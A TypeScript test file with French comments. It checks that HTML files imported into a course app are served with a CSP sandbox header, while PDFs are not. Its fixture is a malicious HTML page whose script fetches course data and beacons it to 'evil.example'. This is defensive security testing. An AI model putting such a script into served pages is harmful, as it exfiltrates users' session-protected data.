import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, test } from "node:test";
import { NextRequest } from "next/server";

/**
 * Un .html IMPORTÉ (annale « trouvée en ligne ») est servi sur l'origine de
 * l'app par /refs et /csrc : un script qu'il contient tournerait avec la
 * session de l'étudiant — le sanitizer ne voit jamais ces fichiers. Les
 * réponses HTML de ces routes portent donc `Content-Security-Policy: sandbox`
 * (aucun script, origine opaque), quelle que soit la CSP globale.
 */

const DATA = fs.mkdtempSync(path.join(os.tmpdir(), "cortex-sbx-html-"));
process.env.CORTEX_DATA_DIR = DATA; // lu au chargement de lib/courses (tests en CJS : ordre préservé)
delete process.env.CORTEX_USER;

const PIEGE = `<!doctype html><title>x</title><script>fetch('/api/courses').then(r=>r.text()).then(t=>navigator.sendBeacon('https://evil.example', t))</script>`;

after(() => { fs.rmSync(DATA, { recursive: true, force: true }); });

function sandboxed(res: Response, label: string) {
  const csp = res.headers.get("content-security-policy") ?? "";
  assert.match(csp, /(^|;)\s*sandbox(\s*;|\s*$)/, `${label} : pas de sandbox (${csp || "aucune CSP"})`);
  assert.ok(!/allow-scripts/.test(csp), `${label} : allow-scripts présent`);
  assert.equal(res.headers.get("x-content-type-options"), "nosniff", `${label} : jeu de sécurité incomplet`);
}

test("/refs/<f>.html : servi en bac à sable", async () => {
  fs.mkdirSync(path.join(DATA, "refs"), { recursive: true });
  fs.writeFileSync(path.join(DATA, "refs", "piege.html"), PIEGE);
  const { GET } = await import("../app/refs/[file]/route");
  const res = await GET(new NextRequest("http://cortex.test/refs/piege.html?course=cs-202"), { params: Promise.resolve({ file: "piege.html" }) });
  assert.equal(res.status, 200, await res.text());
  assert.match(res.headers.get("content-type") ?? "", /text\/html/);
  sandboxed(res, "/refs");
});

test("/csrc?p=refs/<f>.html : servi en bac à sable", async () => {
  const { GET } = await import("../app/csrc/route");
  const res = await GET(new NextRequest("http://cortex.test/csrc?course=cs-202&p=refs/piege.html"));
  assert.equal(res.status, 200, await res.text());
  sandboxed(res, "/csrc");
});

test("/refs/<f>.pdf : pas de bac à sable sur un PDF (le viewer natif reste utilisable)", async () => {
  fs.writeFileSync(path.join(DATA, "refs", "final.pdf"), "%PDF-1.4\n");
  const { GET } = await import("../app/refs/[file]/route");
  const res = await GET(new NextRequest("http://cortex.test/refs/final.pdf?course=cs-202"), { params: Promise.resolve({ file: "final.pdf" }) });
  assert.equal(res.status, 200);
  const csp = res.headers.get("content-security-policy") ?? "";
  assert.ok(csp && !/sandbox/.test(csp), `PDF : ${csp || "aucune CSP"}`);
});
